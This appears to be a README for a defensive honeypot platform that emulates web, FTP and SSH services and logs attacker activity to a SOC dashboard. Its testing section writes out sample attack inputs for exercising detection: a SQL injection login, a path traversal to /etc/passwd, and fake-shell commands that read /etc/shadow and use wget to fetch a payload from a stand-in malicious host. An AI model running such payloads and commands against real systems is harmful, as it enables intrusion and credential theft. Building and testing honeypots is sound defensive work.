To Access Honeypots 


Web Honeypot:     http://52.237.90.251
HTTPS Honeypot:  https://52.237.90.251


SSH Honeypot:    ssh root@52.237.90.251 -p 2222


FTP Honeypot:    ftp 52.237.90.251 2121




# \# Advanced Multi-Service Honeypot Platform

# 

# \## Project Title

# 

# \*\*Advanced Multi-Service Honeypot with Threat Intelligence, Attacker Profiling and SOC Alerting System\*\*

# 

# \## Overview

# 

# This project is an advanced cybersecurity honeypot platform designed for defensive security research, SOC training and attacker behavior analysis. It simulates multiple vulnerable enterprise services such as HTTP, HTTPS, FTP and SSH to capture attacker activity in a controlled environment.

# 

# The platform collects login attempts, commands, file access attempts, upload attempts, web attack payloads and reconnaissance activity. Captured events are forwarded to a central FastAPI service, stored in PostgreSQL, enriched with attacker intelligence, scored by risk level and visualized in Grafana. High-risk incidents can also trigger email alerts.

# 

# \## Features

# 

# \* Advanced HTTP web honeypot with fake enterprise login, admin and documentation pages

# \* HTTPS honeypot using Nginx reverse proxy and self-signed certificate

# \* Advanced FTP honeypot using `pyftpdlib`

# \* Advanced SSH honeypot using `Paramiko`

# \* Captures usernames, passwords, commands, paths, payloads and file activity

# \* Detects common attack types such as:

# 

# &#x20; \* SQL Injection

# &#x20; \* Path Traversal

# &#x20; \* Sensitive File Access

# &#x20; \* Credential Attacks

# &#x20; \* Malware Download Attempts

# &#x20; \* Privilege Escalation Attempts

# &#x20; \* Persistence Attempts

# &#x20; \* Reconnaissance

# \* Central FastAPI SOC API

# \* PostgreSQL event storage

# \* GeoIP attacker profiling

# \* MITRE ATT\&CK mapping

# \* Risk scoring and severity classification

# \* Email alerting with duplicate suppression

# \* Grafana SOC dashboard

# 

# \## Architecture

# 

# ```text

# Attacker / Tester

# &#x20;       |

# &#x20;       v

# Web Honeypot / FTP Honeypot / SSH Honeypot

# &#x20;       |

# &#x20;       v

# FastAPI SOC API

# &#x20;       |

# &#x20;       v

# PostgreSQL Database

# &#x20;       |

# &#x20;       v

# Grafana Dashboard + Email Alerts

# ```

# 

# \## Services and Ports

# 

# | Service           |        Port | Description                  |

# | ----------------- | ----------: | ---------------------------- |

# | HTTP Web Honeypot |        8080 | Fake enterprise web portal   |

# | HTTPS Honeypot    |        8443 | Nginx HTTPS reverse proxy    |

# | FTP Honeypot      |        2121 | Fake enterprise FTP service  |

# | FTP Passive Ports | 30000-30009 | FTP passive mode support     |

# | SSH Honeypot      |        2222 | Fake SSH server              |

# | FastAPI SOC API   |        8000 | Central event collection API |

# | PostgreSQL        |        5432 | Event and alert storage      |

# | Grafana           |        3000 | SOC dashboard                |

# 

# \## Quick Start

# 

# Clone the repository:

# 

# ```bash

# git clone https://github.com/diwakar-1255/advanced-honeypot-platform.git

# cd advanced-honeypot-platform

# ```

# 

# Create the environment file:

# 

# ```bash

# cp .env.example .env

# ```

# 

# Edit `.env` and update email settings if required.

# 

# Start the platform:

# 

# ```bash

# docker compose up -d --build

# ```

# 

# Check running containers:

# 

# ```bash

# docker ps

# ```

# 

# \## Access Links

# 

# HTTP Web Honeypot:

# 

# ```text

# http://localhost:8080

# ```

# 

# HTTPS Web Honeypot:

# 

# ```text

# https://localhost:8443

# ```

# 

# FastAPI API:

# 

# ```text

# http://localhost:8000

# ```

# 

# Grafana Dashboard:

# 

# ```text

# http://localhost:3000

# ```

# 

# Default Grafana credentials:

# 

# ```text

# Username: admin

# Password: admin

# ```

# 

# \## Testing Web Honeypot

# 

# SQL Injection test:

# 

# ```bash

# curl -X POST http://localhost:8080/login \\

# &#x20; -d "username=admin\&password=' OR '1'='1"

# ```

# 

# Path traversal test:

# 

# ```bash

# curl --path-as-is "http://localhost:8080/../../etc/passwd"

# ```

# 

# Scanner-style test:

# 

# ```bash

# curl -A "sqlmap" http://localhost:8080/admin

# ```

# 

# \## Testing FTP Honeypot

# 

# Connect to FTP:

# 

# ```bash

# ftp localhost 2121

# ```

# 

# Example credentials:

# 

# ```text

# admin / admin123

# backup / backup@123

# ftpuser / ftpuser123

# audit / audit2026

# devops / devops@123

# ```

# 

# Example FTP commands:

# 

# ```ftp

# ls

# cd configs

# get .env

# cd ../backups

# get database\_backup\_2026.sql

# quit

# ```

# 

# \## Testing SSH Honeypot

# 

# Connect to SSH honeypot:

# 

# ```bash

# ssh root@localhost -p 2222

# ```

# 

# Password:

# 

# ```text

# toor

# ```

# 

# Example commands inside the fake shell:

# 

# ```bash

# whoami

# id

# uname -a

# cat /etc/passwd

# cat /etc/shadow

# wget http://malicious.example/payload.sh

# sudo -l

# crontab -l

# exit

# ```

# 

# \## API Endpoints

# 

# Recent events:

# 

# ```bash

# curl http://localhost:8000/events/recent

# ```

# 

# Alerts:

# 

# ```bash

# curl http://localhost:8000/alerts

# ```

# 

# Statistics:

# 

# ```bash

# curl http://localhost:8000/stats

# ```

# 

# GeoIP lookup:

# 

# ```bash

# curl http://localhost:8000/geo/8.8.8.8

# ```

# 

# \## Email Alerts

# 

# The platform supports email alerts for high-risk and critical incidents. Duplicate alert suppression prevents email spam by sending alerts only for new incidents or important repeated activity milestones.

# 

# Configure email settings in `.env`:

# 

# ```env

# EMAIL\_ENABLED=true

# SMTP\_HOST=smtp.gmail.com

# SMTP\_PORT=465

# SMTP\_USERNAME=your\_sender\_email@gmail.com

# SMTP\_PASSWORD=your\_gmail\_app\_password

# EMAIL\_FROM=your\_sender\_email@gmail.com

# EMAIL\_TO=receiver\_email@gmail.com

# EMAIL\_USE\_SSL=true

# EMAIL\_USE\_TLS=false

# ```

# 

# Do not commit real `.env` files or passwords.

# 

# \## Security Notice

# 

# This project is for defensive cybersecurity research, SOC training and authorized honeypot deployment only. Do not deploy it on networks you do not own or without permission.

# 

# Never commit real secrets, Gmail app passwords, private keys, API tokens, production credentials or real malware samples.

# 

# \## Author

# 

# Developed by \*\*diwakar-1255\*\* as an advanced cybersecurity honeypot and SOC monitoring project.

# 

